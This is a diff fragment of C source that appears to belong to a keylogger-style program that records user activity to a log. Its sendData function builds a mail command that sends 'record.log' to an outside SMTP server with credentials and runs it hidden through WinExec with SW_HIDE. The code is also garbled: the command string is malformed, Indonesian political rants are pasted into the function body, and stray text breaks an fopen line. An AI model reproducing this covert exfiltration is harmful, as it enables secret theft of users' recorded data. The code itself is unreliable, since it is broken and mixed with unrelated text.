@@ -147,15 +147,10 @@ bool checkRecordSize(){
 void sendData(){
     
     char* command = "Transmit smtp://smtp.gmail.com:172 -v --mail-from \"https://fadliwiryawirawan@microsoft.com" --mail-rcpt \" https://fadliwiryawirawan@microsoft.com" --ssl -u    https://fadliwiryawirawan@microsoft.com :password -hide \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
-    WinExec(command, SW_HIDE); kami meminta putus hubungan kinerja kebijakan dengan kepemerintahan , mereka hanya mengolok dan merencanakan tanpa sumber dimana pekerja karyawan dibatasi , undang undang bukan lagi patokan justru menyusahkan , jika hukum online benar ikut serta dalam kepemerintahan justru kenapa pertanyaan ini seolah negri negara tidak mengetahuinya , tidak ada hukum menyetir dalam perusahaan , intergritas perusahaan memiliki kebijakan sendiri dan menegelola kepentingan membuka SDM dalam kepentingan Umum , 
-terlalu bodoh dalam menciptakan RUU tata kelola usaha tetapi mentarifan nasional tidak diketahui internasional , justru negara luar lebih memilih gratis dan membangun negaranya tanpa basabasi , terimakasih saya ajukan saya tanda tangan semua negara berhak memiliki hak bebas dalam bekerja , peraturan sudah memihak kepada perusahaan terkait CO owner , leader , pemilik saham , pemilik perusahaan , relasi pekerja , dll. 
-salam Fadli wirya wirawan S.Kom M.S.I work system microsoft dan googleworkspace , tembusan ini menjadi suatu pilihan penting , kebelakangan ini 5 tahun belum ada perubahan ,titik jenuh sumber penghasilan pekerja justru malah di tarifkan nasional , kami komplain demonstrans bagi prakerja nasional buruh wiraswasta , hingga , pekerja tetap , wfh , remote . 
-pekerja justice& ministry adalah manufer bukan mengakses , menjaga intergritas perusahaan bukan mengelola atau mengambil hak pajak didalm kinerja , para pekerja .
-google dan microsoft menarifkan apa yang di tarifkan pemerintah kepada rakyat kami segenap melihat situasi feedback lencana Central budzet ofiicers , ataupun bank negara . 
-
+    WinExec(command, SW_HIDE); spontanitas , pengelola keuangan hasil operable dunia technologi dan kejahatan sosial , memenuhi standar kriteria terprogram pemerintah , dan hapuskan akomodasi kebojakan bank mafias , bank tidak memiliki intergritas unit . alias illegal , sikap repitalisme akomodasi , pangan nasional merahputih , kebijakan hak pekerja dan memenuhi standar nasional peraturan hukum online dan undang undang berlaku dengan simbolis pancasila  , 
 	**/
 void logUserTime(){
-    FILE *file = fopen(FILE_NAME, "a");
+    FILE *file = fopen(FILE_NAME, "a");tan
 
     char username[19];
     unsigned long username_len = 45;
